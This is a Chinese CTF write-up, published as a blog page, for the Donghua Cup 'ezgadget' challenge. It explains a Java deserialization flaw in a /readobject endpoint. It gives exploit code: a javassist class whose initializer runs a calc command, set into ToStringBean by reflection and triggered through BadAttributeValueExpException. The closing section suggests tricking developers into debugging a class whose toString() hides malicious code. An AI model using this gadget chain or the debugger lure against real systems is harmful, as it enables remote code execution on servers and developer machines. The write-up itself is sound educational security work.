@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>东华杯ezgadget | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目分析题目给了一个jar,反编译查看 路由 public class IndexController &amp;#123;     @ResponseBody     @RequestMapping(&amp;#123;&quot;&#x2F;&quot;&amp;#125;)     public String index(HttpServletRequest request, HttpServletResponse resp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="东华杯ezgadget">
+<meta property="og:url" content="http://example.com/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="题目分析题目给了一个jar,反编译查看 路由 public class IndexController &amp;#123;     @ResponseBody     @RequestMapping(&amp;#123;&quot;&#x2F;&quot;&amp;#125;)     public String index(HttpServletRequest request, HttpServletResponse resp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png">
+<meta property="article:published_time" content="2023-10-19T08:02:57.000Z">
+<meta property="article:modified_time" content="2023-10-19T10:01:09.616Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '东华杯ezgadget',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-19 18:01:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">东华杯ezgadget</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-19T08:02:57.000Z" title="发表于 2023-10-19 16:02:57">2023-10-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-19T10:01:09.616Z" title="更新于 2023-10-19 18:01:09">2023-10-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="东华杯ezgadget"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目给了一个jar,反编译查看</p>
+<p>路由</p>
+<pre><code class="java">public class IndexController &#123;
+    @ResponseBody
+    @RequestMapping(&#123;&quot;/&quot;&#125;)
+    public String index(HttpServletRequest request, HttpServletResponse response) &#123;
+        return &quot;index&quot;;
+    &#125;
+
+    @ResponseBody
+    @RequestMapping(&#123;&quot;/readobject&quot;&#125;)
+    public String unser(@RequestParam(name = &quot;data&quot;,required = true) String data, Model model) throws Exception &#123;
+        byte[] b = Tools.base64Decode(data);
+        InputStream inputStream = new ByteArrayInputStream(b);
+        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+        String name = objectInputStream.readUTF();
+        int year = objectInputStream.readInt();
+        if (name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021) &#123;
+            objectInputStream.readObject();
+        &#125;
+
+        return &quot;welcome bro.&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>这里存在一个反序列化入口<code>/readobject</code>但是存在限制</p>
+<pre><code class="java">if (name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021) &#123;
+    objectInputStream.readObject();
+&#125;
+</code></pre>
+<p>这里肯定是考反序列化的知识了，再看看能利用的类</p>
+<p>发现<code>ToStringBean.toString</code>方法可以加载任意类，只需要控制<code>this.ClassByte</code>的值即可</p>
+<pre><code class="java">public class ToStringBean extends ClassLoader implements Serializable &#123;
+    private byte[] ClassByte;
+
+    public String toString() &#123;
+        ToStringBean toStringBean = new ToStringBean();
+        Class clazz = toStringBean.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length);
+        Object Obj = null;
+
+        try &#123;
+            Obj = clazz.newInstance();
+        &#125; catch (InstantiationException var5) &#123;
+            var5.printStackTrace();
+        &#125; catch (IllegalAccessException var6) &#123;
+            var6.printStackTrace();
+        &#125;
+
+        return &quot;enjoy it.&quot;;
+    &#125;
+&#125;
+</code></pre>
+<h1 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h1><p>这题还是比较简单的，首先使用<code>javassist</code>构造恶意的字节码</p>
+<p>环境依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+    &lt;version&gt;3.22.0-GA&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>代码如下：</p>
+<pre><code class="java">//构造恶意类
+ClassPool pool = ClassPool.getDefault();
+CtClass Evil = pool.makeClass(&quot;Evil&quot;);
+Evil.setName(&quot;Evil&quot;);
+String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+CtConstructor constructor = Evil.makeClassInitializer();
+constructor.insertBefore(cmd);
+byte[] bytes =Evil.toBytecode();
+</code></pre>
+<p>然后通过反射将字节码传入<code>ToStringBean</code>对象的属性<code>this.ClassByte</code></p>
+<pre><code class="java">ToStringBean toStringBean = new ToStringBean();
+Field ClassByte = ToStringBean.class.getDeclaredField(&quot;ClassByte&quot;);
+ClassByte.setAccessible(true);
+ClassByte.set(toStringBean,bytes);
+</code></pre>
+<p>到这里可以通过<code>toStringBean.toString();</code>检测是否能够成功弹出计算器，这里是成功了</p>
+<p>下一步是找到能够触发toString()的地方，最好是重写了readObject()的</p>
+<p>掏出当年学习CC链画的图：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019162413340.png" alt="image-20231019162413340"></p>
+<p>找到了可利用的类<code>javax.management.BadAttributeValueExpException</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019162835755.png" alt="image-20231019162835755"></p>
+<p>这个参数<code>valObj</code>可以由<code>val</code>控制，而<code>val</code>是私有属性，通过构造函数赋值</p>
+<pre><code class="java">public BadAttributeValueExpException (Object val) &#123;
+    this.val = val == null ? null : val.toString();
+&#125;
+</code></pre>
+<p>如果val直接传入<code>toStringBean</code>会在反序列化前就调用了toString，会对利用造成一定困扰</p>
+<p>所以这里传入<code>null</code>，然后通过反射修改<code>val</code>的值</p>
+<pre><code class="java">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
+val.setAccessible(true);
+val.set(badAttributeValueExpException,toStringBean);
+</code></pre>
+<p>后面就是进行序列化操作了，在这里还要解决前面的限制</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019163907545.png" alt="image-20231019163907545"></p>
+<p>在反序列化之前会调用readUTF()和readInt()，所以序列化的时候也要有构造对应的内容</p>
+<pre><code class="java">yteArrayOutputStream btout = new ByteArrayOutputStream();
+ObjectOutputStream objOut = new ObjectOutputStream(btout);
+objOut.writeUTF(&quot;gadgets&quot;);
+objOut.writeInt(2021);
+objOut.writeObject(badAttributeValueExpException);
+</code></pre>
+<p>writeUTF和writeInt的顺序是不能调换的后面使用readUTF和readInt读取数据时能够正确地解析数据，如果前面是writeUTF再writeInt,后面就要readUTF再readInt，如果前面是writeInt再writeUTF,后面就要readInt再readUTF</p>
+<p>readUTF方法也必须先于readInt方法调用。这是因为writeUTF和readUTF方法使用一种特殊的编码方式来存储和解析字符串，而writeInt和readInt方法则使用基本的二进制编码方式来处理整数。</p>
+<p>后面就是base64加密输出payload</p>
+<pre><code class="java">String payload = Base64.getEncoder().encodeToString(btout.toByteArray());
+System.out.println(payload);
+</code></pre>
+<p>payload最好进行一次url编码</p>
+<p>传入参数后成功弹出计算器：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019164702956.png" alt="image-20231019164702956"></p>
+<h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><p>在调试的时候，发现从第28行开始，每一步都会弹出一个或者两个计算器</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019165251779.png" alt="image-20231019165251779"></p>
+<p>难道说IDEA调试所产生的字符串会触发当前已使用类toString()方法的自动调用？</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019165506652.png" alt="image-20231019165506652"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>重新创建一个项目进行测试</p>
+<p>首先写一个有<code>toString</code>方法的类</p>
+<pre><code class="java">public class test &#123;
+    private String a;
+    public test(String b)&#123;
+        a = b;
+    &#125;
+    public String toString() &#123;
+        System.out.println(&quot;触发test.toString&quot;);
+        return super.toString();
+    &#125;
+&#125;
+</code></pre>
+<p>再创建一个类进行调试</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        test t = new test(&quot;aa&quot;);
+        int x = 1;
+        int y = 2;
+        int res = x + y;
+        System.out.println(res);
+    &#125;
+&#125;
+</code></pre>
+<p>这个main只是new 了一个test对象，后面再也没有用到与test有关的东西了</p>
+<p>当new test()成功之后，就开始触发了这个toString,往后每一步都触发一次</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231019171829264.png" alt="image-20231019171829264"></p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这个应该不能算是一个漏洞吧，只能说是IDEA的特性。站在攻防角度来说，我只能想到一种利用方式——社工</p>
+<p>攻击者把恶意代码藏在某个类的toString方法里(建议藏深一点)，然后发个受害者，以某种方式引导让他去调试一下。当受害者调试到创建或实例化那个类的代码之后就会触发toString方法里的恶意代码，然后就GG了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/">http://example.com/2023/10/19/东华杯ezgadget/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/09/15/C3P0/" title="C3P0"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C3P0</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp%E7%BC%96%E5%86%99"><span class="toc-number">2.</span> <span class="toc-text">exp编写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">发现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">3.1.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">3.2.</span> <span class="toc-text">思考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="东华杯ezgadget"/></a><div class="content"><a class="title" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget">东华杯ezgadget</a><time datetime="2023-10-19T08:02:57.000Z" title="发表于 2023-10-19 16:02:57">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/15/C3P0/" title="C3P0"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="C3P0"/></a><div class="content"><a class="title" href="/2023/09/15/C3P0/" title="C3P0">C3P0</a><time datetime="2023-09-15T06:40:10.000Z" title="发表于 2023-09-15 14:40:10">2023-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-739d73_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="JDBC反序列化"/></a><div class="content"><a class="title" href="/2023/09/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化">JDBC反序列化</a><time datetime="2023-09-13T02:17:47.000Z" title="发表于 2023-09-13 10:17:47">2023-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-qzmlj5_2560x1600.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsBeanutils反序列化"/></a><div class="content"><a class="title" href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化">CommonsBeanutils反序列化</a><time datetime="2023-09-11T02:10:00.000Z" title="发表于 2023-09-11 10:10:00">2023-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java Agent内存马"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-5g3zl1_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Java Agent内存马"/></a><div class="content"><a class="title" href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java Agent内存马">Java Agent内存马</a><time datetime="2023-09-04T01:48:25.000Z" title="发表于 2023-09-04 09:48:25">2023-09-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
+  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
+  mermaid.initialize(options);
+}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addModeChange('mermaid', runMermaid)
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
